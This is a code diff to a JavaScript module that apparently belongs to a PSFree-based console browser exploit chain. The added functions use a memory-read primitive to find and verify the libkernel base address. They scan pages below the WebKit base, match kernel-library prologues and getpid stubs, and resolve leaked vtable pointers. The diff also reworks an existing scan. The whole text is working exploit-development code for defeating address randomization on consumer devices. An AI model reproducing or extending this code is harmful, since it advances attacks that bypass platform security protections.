@@ -682,7 +682,6 @@ function psfreePoopsRanges(off) {
     const raw = [
         { lo: POOPS_SCAN_LO, hi: POOPS_OOM_LO, tag: "low" },
         { lo: 0xe0000, hi: 0xf8000, tag: "mid" },
-        { lo: 0x1360000, hi: Math.min(cap, 0x1480000), tag: "g5" },
     ];
     const out = [];
     for (let i = 0; i < raw.length; i++) {
@@ -772,6 +771,25 @@ function psfreeMissChunk(state) {
 
 export function formatPsfreeStats(st) {
     return psfreeStatsLine(st);
+}
+
+/** cal / vtable ext ptr → candidate module bases (page + k__error). */
+export function extPtrToLkCandidates(p, fnPtr, off, webkitBase) {
+    const out = [];
+    const seen = new Set();
+    function add(lk) {
+        if (!lk || lk.hi < 0x8) return;
+        const k = String(lk);
+        if (seen.has(k)) return;
+        seen.add(k);
+        out.push(lk);
+    }
+    if (!fnPtr) return out;
+    add(pageAlignDown(fnPtr, 0x4000));
+    add(pageAlignDown(fnPtr, 0x4000).sub32(0x4000));
+    const hit = lkFromFnPtrPsfree(p, fnPtr, off, null, webkitBase);
+    if (hit && hit.lk) add(hit.lk);
+    return out;
 }
 
 function fmtMagic4(w) {
@@ -1581,7 +1599,7 @@ function scanLeakExtPtrChunk(p, webkitBase, off, state, retain) {
         state.tried++;
         if (state.extList.length < 16)
             state.extList.push({ ptr: key, source });
-        const hit = lkFromFnPtrLite(p, fnPtr, off);
+        const hit = lkFromFnPtrPsfree(p, fnPtr, off, null, webkitBase);
         if (!hit) return null;
         saveLibkernelSession(hit.lk, hit.iatRva);
         return {
@@ -1677,6 +1695,146 @@ export function showLibkernelGuesses(webkitBase, nativeFn, log) {
 /** @deprecated blind reads OOM — use showLibkernelGuesses */
 export function probeLibkernelGuesses(p, webkitBase, nativeFn, log) {
     return showLibkernelGuesses(webkitBase, nativeFn, log);
+}
+
+/** ≤6 reads — prologue + optional getpid stub (no module walk). */
+export function verifyLibkernelBase(p, lk, off) {
+    if (!lk) return { ok: false, error: "no address" };
+    if ((lk.low & 0x3fff) !== 0)
+        return { ok: false, error: "not 16KB-aligned" };
+    if (!isLibkernelPrologue(p, lk))
+        return { ok: false, error: "prologue miss @ " + lk };
+    const offs = getpidStubOffsets(off);
+    for (let i = 0; i < offs.length; i++) {
+        const stub = read8p(p, lk.add32(offs[i]));
+        if (stub && isGetpidStub(stub))
+            return { ok: true, lk, stubOff: offs[i], stub, strong: true };
+    }
+    return { ok: true, lk, weak: true, warn: "prologue OK — getpid stub not at known offsets" };
+}
+
+/** Hunt libkernel prologue in pages below webkit (OOM-safe, no gap scan). */
+export function scanBelowWebkitChunk(p, webkitBase, off, state, opts) {
+    opts = opts || {};
+    const STEP = 0x4000;
+    const maxPages = opts.maxPages || 128;
+
+    if (!state) {
+        const wb = ptrBig(webkitBase) & ~0x3fffn;
+        const span = BigInt(maxPages * STEP);
+        const lo = wb > span ? wb - span : 0n;
+        state = { cursor: lo, end: wb, pages: 0, maxPages };
+        return {
+            done: false,
+            state,
+            phase: "below-start",
+            from: lo.toString(16),
+            to: wb.toString(16),
+            maxPages,
+        };
+    }
+
+    let batch = 0;
+    while (state.cursor < state.end && batch < 4 && state.pages < state.maxPages) {
+        const addr = bigToPtr(state.cursor);
+        state.cursor += BigInt(STEP);
+        state.pages++;
+        batch++;
+        if (addr.hi < 0x8 || (addr.low & 0x3fff) !== 0) continue;
+        if (isLibkernelPrologue(p, addr)) {
+            saveLibkernelSession(addr, null);
+            return {
+                done: true,
+                ok: true,
+                lk: addr,
+                iatRva: null,
+                source: "below-wk",
+                state,
+                phase: "below-hit",
+                pages: state.pages,
+            };
+        }
+    }
+
+    if (state.cursor >= state.end || state.pages >= state.maxPages) {
+        return {
+            done: true,
+            ok: false,
+            lk: null,
+            state,
+            phase: "below-miss",
+            pages: state.pages,
+        };
+    }
+    return {
+        done: false,
+        state,
+        phase: "below",
+        pages: state.pages,
+        at: state.cursor.toString(16),
+    };
+}
+
+/**
+ * PSFree replacement — guess → below-webkit → vtable leak.
+ * No PLT scan, no high GOT, no g5 island.
+ */
+export function resolveLibkernelFindChunk(p, webkitBase, off, state, opts) {
+    opts = opts || {};
+    if (!state) {
+        state = { stage: "guess", sub: null };
+        return { done: false, state, phase: "find-start" };
+    }
+
+    if (state.stage === "guess") {
+        const c = scanGuessCandidatesChunk(p, webkitBase, opts.nativeFn, state.sub);
+        state.sub = c.state;
+        if (c.done && c.lk) {
+            return Object.assign({ ok: true, state }, c);
+        }
+        if (c.done) {
+            state.stage = "below";
+            state.sub = null;
+            return { done: false, state, phase: "below-next", prev: c.phase };
+        }
+        return Object.assign({ state }, c);
+    }
+
+    if (state.stage === "below") {
+        const c = scanBelowWebkitChunk(p, webkitBase, off, state.sub, opts);
+        state.sub = c.state;
+        if (c.done && c.lk) {
+            return Object.assign({ ok: true, state }, c);
+        }
+        if (c.done) {
+            state.stage = "leak";
+            state.sub = null;
+            return { done: false, state, phase: "leak-next", prev: c.phase, belowPages: c.pages };
+        }
+        return Object.assign({ state }, c);
+    }
+
+    if (state.stage === "leak") {
+        const c = scanLeakExtPtrChunk(p, webkitBase, off, state.sub, opts.retain);
+        state.sub = c.state;
+        if (c.done && c.lk) {
+            return Object.assign({ ok: true, state }, c);
+        }
+        if (c.done) {
+            return {
+                done: true,
+                ok: false,
+                error: "find exhausted",
+                state: null,
+                phase: "find-miss",
+                extList: c.extList,
+                tried: c.tried,
+            };
+        }
+        return Object.assign({ state }, c);
+    }
+
+    return { done: true, ok: false, state: null, phase: "find-miss" };
 }
 
 /** Chunked leakval scan — reads heap slots only, follows ext code ptrs (OOM-safe). */
